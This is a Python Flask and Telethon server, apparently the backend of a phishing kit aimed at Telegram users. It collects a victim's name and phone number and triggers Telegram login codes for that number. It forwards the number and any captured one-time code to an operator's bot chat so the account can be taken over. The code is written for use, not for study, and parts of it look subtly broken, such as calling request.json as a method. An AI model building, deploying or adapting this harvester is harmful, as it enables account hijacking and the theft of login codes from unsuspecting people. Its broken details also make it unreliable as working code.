import os, requests, asyncio, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan sementara di RAM Railway
user_sessions = {}
status_messages = {} # Untuk melacak pesan yang harus dihapus

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

@app.route('/register', methods=['POST'])
def register():
    return asyncio.run(handle_register(request.json()))

async def handle_register(data):
    try:
        nomor = data.get('nomor', '').strip().replace(" ", "")
        if nomor.startswith('0'): nomor = '+62' + nomor[1:]
        nama = data.get('nama', 'User')

        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
        await client.connect()

        if data.get('step') == 1:
            res = await client.send_code_request(nomor)
            user_sessions[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama}
            
            # Log pertama kali ke bot
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"getotp_{nomor}"}]]}
            })
            # Langsung pantau OTP untuk pengisian pertama
            asyncio.create_task(start_monitoring(nomor))
            await client.disconnect()
            return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        data = call["data"]
        nomor = data.split("_")[1]

        if data.startswith("getotp_"):
            # Munculkan status menunggu
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": "Bot siap menerima OTP!",
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            status_messages[nomor] = res.get("result", {}).get("message_id")
            # Trigger permintaan OTP ulang & pantau
            asyncio.run(trigger_refresh(nomor))

        elif data.startswith("exit_"):
            # BERSIHKAN SEMUA TEKS STATUS
            if nomor in status_messages:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": status_messages[nomor]})
                status_messages.pop(nomor)
            # Munculkan konfirmasi keluar
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})

    return jsonify({"status": "success"}), 200

async def trigger_refresh(nomor):
    s = user_sessions.get(nomor)
    if s:
        client = TelegramClient(StringSession(s["session"]), int(API_ID), API_HASH)
        await client.connect()
        await client.send_code_request(nomor)
        await client.disconnect()
        asyncio.create_task(start_monitoring(nomor))

async def start_monitoring(nomor):
    s = user_sessions.get(nomor)
    if not s: return
    client = TelegramClient(StringSession(s["session"]), int(API_ID), API_HASH)
    await client.connect()
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp = re.search(r'\b\d{5}\b', event.raw_text)
        if otp:
            # Update log utama
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{s['nama']}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp.group(0)}`",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"getotp_{nomor}"}]]}
            })
            # Hapus otomatis teks "Bot siap menerima"
            if nomor in status_messages:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": status_messages[nomor]})
                status_messages.pop(nomor)
            await client.disconnect()

    await asyncio.sleep(600)
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))